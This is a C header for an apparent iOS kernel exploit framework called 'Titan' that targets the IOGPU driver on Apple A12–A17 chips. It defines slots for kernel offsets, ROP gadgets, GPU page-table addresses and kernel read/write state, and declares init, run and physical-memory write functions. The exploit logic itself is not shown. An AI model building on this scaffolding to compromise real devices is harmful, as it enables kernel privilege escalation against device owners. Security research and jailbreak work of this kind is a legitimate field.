#ifndef TITAN_H
#define TITAN_H

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>
#include <mach/mach.h>

typedef enum {
    SOC_A12 = 0,
    SOC_A13,
    SOC_A14,
    SOC_A15,
    SOC_A16,
    SOC_A17,
} soc_t;

struct TitanContext {
    bool supported;
    soc_t soc;
    uint64_t xnu_version;
    bool large_memory;

    mach_port_t IOGPUDevice_port;

    struct {
        uint32_t id;
        uint64_t kaddr;
    } command_buffers[2];

    uint64_t iorvbar;
    uint64_t iorvbar_mask;
    uint64_t gfx_text_base;
    uint64_t gfx_text_size;
    uint64_t gfx_text_pa;
    uint64_t gfx_data_size;
    uint64_t gfx_data_const_start;
    uint64_t gfx_data_pa_mangled;
    uint64_t rtk_patch_page_table_base;

    uint64_t gfx_data_pa;
    uint64_t gfx_ttbr_pa;
    
    uint64_t gfx_data_kaddr;
    uint64_t gfx_text_kaddr;
    uint64_t gfx_ttbr_kaddr;

    vm_address_t gfx_text_mapping;

    uint64_t stack_frame_size;

    uint64_t IOGPUDeviceUserClient_vtable;
    uint64_t IOGPUDevice;
    uint64_t IOGPU;
    int command_queue_id;
    
    struct {
        uint64_t pte;
        uint64_t kaddr;
    } krw_info;

    struct s_TitanStructureOffsets {
        struct {
            uint64_t IOGPUDevice;
        } IOGPUDeviceUserClient;

        struct {
            uint64_t GPUVirtualAddress;
        } IOGPUMemoryMap;

        struct {
            uint64_t MDSID_map;
            uint64_t IOGPU;
            uint64_t IOGPUNamespace;
        } IOGPUDevice;

        struct {
            uint64_t dsids_supported;
            uint64_t fence_value;
            uint64_t IOGPUMemoryMap;
            uint64_t buffer_offset;
        } IOGPU;

        struct {
            uint64_t handles;
        } IOGPUWeakNamespace;

        struct {
            uint64_t map;
        } IOGPUDeviceShmem;

        struct {
            uint64_t fAddress;
        } IOMemoryMap;
    } offsets;
    
    struct s_TitanGadgets {
        uint64_t write;
        uint64_t tpidrro_el0;
        uint64_t rop_invoke;
        uint64_t cache_flush;
        uint64_t spin;
        uint64_t tlb_flush;
    } gadgets;

    struct s_TitanAddresses {
        uint64_t power_thread;
        uint64_t target_job;
        uint64_t hibernation_context;
        uint64_t arm_hb_context;
        uint64_t job_list;
        uint64_t asc_impl;
        uint64_t asc_dbg;
        uint64_t gfx_new_mapping_va;
    } addresses;

    struct s_TitanFunctions {
        uint64_t arm_hibernate;
    } functions;
};
extern struct TitanContext gTitanContext;

#define titan_koffsetof(type, field) (gTitanContext.offsets.type.field)
#define titan_gadget(x) (gTitanContext.gadgets.x)
#define titan_address(x) (gTitanContext.addresses.x)
#define titan_function(x) (gTitanContext.functions.x)

#define XNU_VERSION_ENCODED(a, b, c, d, e) \
    (((uint64_t)(a) << 40) | ((uint64_t)(b & 0x3FF) << 30) | ((uint64_t)(c & 0x3FF) << 20) | ((uint64_t)(d & 0x3FF) << 10) | (uint64_t)(e & 0x3FF))

#define XNU_VERSION_GREATER_THAN(a, b, c, d, e) \
    (gTitanContext.xnu_version > XNU_VERSION_ENCODED(a, b, c, d, e))

#define XNU_VERSION_LESS_THAN(a, b, c, d, e) \
    (gTitanContext.xnu_version < XNU_VERSION_ENCODED(a, b, c, d, e))

#define XNU_MAJOR_GREATER_THAN(a) \
    (gTitanContext.xnu_version >> 40 > (a))

int titan_init(void);
int titan_run(void);
void titan_deinit(void);

int titan_physwritebuf(uint64_t pa, const void *buffer, size_t size);

#endif // TITAN_H
